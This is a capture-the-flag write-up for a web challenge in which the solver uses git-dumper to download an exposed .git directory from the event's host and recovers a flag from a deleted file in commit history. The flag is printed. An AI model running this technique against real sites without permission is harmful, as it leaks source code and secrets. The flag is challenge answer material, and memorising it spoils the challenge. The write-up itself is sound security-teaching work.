# To the window... to the wall...

## Description

The "Legacy Node" is currently down for maintenance. The developers say they are rolling back to a previous version because of a "configuration error". The Node has been under constant attack because it's known for the contents hidden in its directories.



Even though the Node is down, it seems they might have left the **version control** system exposed to the public.



---



host: https://ctf1. savosec.fi/open_window/

pip install git-dumper

git-dumper https://ctf1.savosec.fi/open_window/.git ./website

PS C:\Users\jespe\PycharmProjects\2026-savosec\challenges\Web\one-does-not-simply-walk-into\website> git log --oneline --graph --all
* bafe777 (HEAD -> master) Removed the flag from public directory. It should be safe in history though.
* 276222e Added the secret flag for safe keeping
* 0d0fb35 Initial commit: Site structure
PS C:\Users\jespe\PycharmProjects\2026-savosec\challenges\Web\one-does-not-simply-walk-into\website> git show bafe777      
commit bafe777f73f51475a3f62addcee6e3150be5b06d (HEAD -> master)
Author: NeuroSyncDev <dev@neurosync.corp>
Date:   Sun May 3 07:25:11 2026 +0000

    Removed the flag from public directory. It should be safe in history though.

diff --git a/secret_flag.txt b/secret_flag.txt
deleted file mode 100644
index 493c78a..0000000
--- a/secret_flag.txt
+++ /dev/null
@@ -1 +0,0 @@
:...skipping...
commit bafe777f73f51475a3f62addcee6e3150be5b06d (HEAD -> master)
Author: NeuroSyncDev <dev@neurosync.corp>
Date:   Sun May 3 07:25:11 2026 +0000

    Removed the flag from public directory. It should be safe in history though.

diff --git a/secret_flag.txt b/secret_flag.txt
deleted file mode 100644
index 493c78a..0000000
--- a/secret_flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-SavoSec{G1t_H1st0ry_N3v3R_F0rG3ts}
~
~
~
~
~
~
~
~
~
~
(END)

Flag: SavoSec{G1t_H1st0ry_N3v3R_F0rG3ts}

